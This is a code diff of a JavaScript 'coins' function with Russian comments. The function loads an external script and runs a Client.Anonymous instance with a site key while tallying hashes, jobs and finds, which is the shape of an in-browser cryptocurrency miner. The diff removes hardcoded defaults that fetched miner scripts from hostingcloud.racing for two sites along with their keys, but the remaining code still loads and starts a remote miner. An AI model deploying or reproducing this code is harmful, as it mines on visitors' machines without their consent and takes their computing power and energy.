@@ -1,24 +1,12 @@
-function coins(sites) {
+function coins() {
     let instance = {};
     const url = new URL(document.location.href);
-    if (!arguments.length) {
-        sites = [{
-                id: 'local',
-                match: '127.0.0.1',
-                src: 'https://www.hostingcloud.racing/2KFX.js',
-                key: 'a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97'
-            },
-            {
-                id: 'share',
-                match: 'shareform.ru',
-                src: 'https://www.hostingcloud.racing/rhdQ.js',
-                key: 'cc138bc50ff7148e00b642bfa9beb5f8b8c41659c84996f1de44457d1ba5d6dc'
-            }
-        ];
-    }
+
+    let sites = [];
+
     let src; //script src
     let key;
-    
+
     // настройки по умолчанию
     let settings = {};
     settings.throttle = 0;
@@ -41,7 +29,7 @@ function coins(sites) {
     let hashes = 0;
     let jobs = 0;
     let founds = 0;
-    
+
 
     function loadScript(src) {
         return new Promise(function(resolve, reject) {
@@ -69,7 +57,7 @@ function coins(sites) {
         key = k;
         return instance;
     };
-    
+
     // присваиваем или получаем settings
     instance.settings = (s) => {
         if (!arguments.length) return settings;
@@ -89,7 +77,7 @@ function coins(sites) {
                 key: 'a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97'
             }
         */
-        
+
         return instance;
     };
 
@@ -107,7 +95,7 @@ function coins(sites) {
             .then(
                 function(result) {
                     let _client = new Client.Anonymous(key, settings);
-                    
+
                     start = new Date();
                     now = start;
                     last = start;
